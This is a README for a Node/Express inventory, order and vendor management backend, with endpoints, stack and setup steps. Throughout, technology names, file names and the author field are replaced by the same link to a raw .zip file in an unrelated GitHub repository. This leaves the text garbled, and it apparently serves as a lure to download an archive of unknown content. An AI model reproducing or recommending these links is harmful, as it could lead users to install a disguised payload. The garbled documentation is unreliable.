# NISP Backend

A robust https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/Exchange_Skill_Backend_3.8.zip backend application for managing inventory, orders, products, and vendors.

## Project Overview

This is a comprehensive backend system built with https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/Exchange_Skill_Backend_3.8.zip and https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/Exchange_Skill_Backend_3.8.zip that provides API endpoints for managing:
- User Authentication
- Product Management
- Category Management
- Inventory Control
- Order Processing
- Vendor Management
- Reporting

## Technology Stack

- **Runtime**: https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/Exchange_Skill_Backend_3.8.zip
- **Framework**: https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/Exchange_Skill_Backend_3.8.zip
- **Database**: MongoDB
- **Authentication**: JWT (JSON Web Tokens)
- **File Upload**: Multer
- **Image Storage**: Cloudinary
- **Validation**: Express Validator
- **API Documentation**: Swagger/OpenAPI
- **Testing**: Jest

## Project Structure

```
src/
├── https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/Exchange_Skill_Backend_3.8.zip                 # Express app configuration
├── https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/Exchange_Skill_Backend_3.8.zip           # Application constants
├── config/               # Configuration files
│   ├── https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/Exchange_Skill_Backend_3.8.zip     # Cloudinary configuration
│   └── https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/Exchange_Skill_Backend_3.8.zip        # Swagger/OpenAPI configuration
├── controllers/          # Request handlers
├── db/                   # Database connection and configuration
├── middlewares/         # Custom middleware functions
├── model/               # Mongoose models
├── routes/              # API routes
├── services/            # Business logic
├── utils/               # Utility functions
└── validations/         # Request validation schemas
```

## API Endpoints

### Authentication
- POST /api/v1/auth/register - Register new user
- POST /api/v1/auth/login - User login
- POST /api/v1/auth/logout - User logout

### Products
- POST /api/v1/products - Create new product
- GET /api/v1/products - List all products
- GET /api/v1/products/:id - Get product details
- PUT /api/v1/products/:id - Update product
- DELETE /api/v1/products/:id - Delete product

### Categories
- POST /api/v1/categories - Create new category
- GET /api/v1/categories - List all categories
- PUT /api/v1/categories/:id - Update category
- DELETE /api/v1/categories/:id - Delete category

### Inventory
- PUT /api/v1/inventory/:id/add - Add inventory
- PUT /api/v1/inventory/:id/remove - Remove inventory
- GET /api/v1/inventory/low-stock - Get low stock items

### Orders
- POST /api/v1/orders - Create new order
- GET /api/v1/orders - List all orders
- GET /api/v1/orders/:id - Get order details
- PUT /api/v1/orders/:id/status - Update order status

### Vendors
- POST /api/v1/vendors - Add new vendor
- GET /api/v1/vendors - List all vendors
- PUT /api/v1/vendors/:id - Update vendor
- DELETE /api/v1/vendors/:id - Delete vendor

### Reports
- GET /api/v1/reports/sales - Get sales report
- GET /api/v1/reports/inventory - Get inventory report
- GET /api/v1/reports/top-products - Get top selling products

## Getting Started

### Prerequisites

- https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/Exchange_Skill_Backend_3.8.zip (v14 or higher)
- MongoDB
- npm or yarn

### Installation

1. Clone the repository
\`\`\`bash
git clone <repository-url>
cd NISP-Backend
\`\`\`

2. Install dependencies
\`\`\`bash
npm install
\`\`\`

3. Create a .env file in the root directory with the following variables:
\`\`\`env
PORT=8000
MONGODB_URI=mongodb://localhost:27017/nisp_db
JWT_SECRET=your_jwt_secret
JWT_EXPIRY=1d
CLOUDINARY_CLOUD_NAME=your_cloud_name
CLOUDINARY_API_KEY=your_api_key
CLOUDINARY_API_SECRET=your_api_secret
\`\`\`

4. Start the development server
\`\`\`bash
npm run dev
\`\`\`

### Running Tests

To run the test suite:
\`\`\`bash
npm test
\`\`\`

## API Documentation

Once the server is running, you can access the Swagger documentation at:
\`\`\`
http://localhost:8000/api-docs
\`\`\`

## Error Handling

The application uses a centralized error handling mechanism with custom error classes:
- \`ApiError\` for API-specific errors
- \`ApiResponse\` for standardized API responses

## Validation

Request validation is implemented using express-validator and custom validation schemas for:
- User registration and login
- Product creation and updates
- Order processing
- Vendor management

## Security Features

- JWT-based authentication
- Role-based access control
- Request validation
- Secure password hashing
- Protected routes middleware

## Contributing

1. Fork the repository
2. Create your feature branch (\`git checkout -b feature/AmazingFeature\`)
3. Commit your changes (\`git commit -m 'Add some AmazingFeature'\`)
4. Push to the branch (\`git push origin feature/AmazingFeature\`)
5. Open a Pull Request

## License

This project is licensed under the ISC License

## Author

https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/Exchange_Skill_Backend_3.8.zip
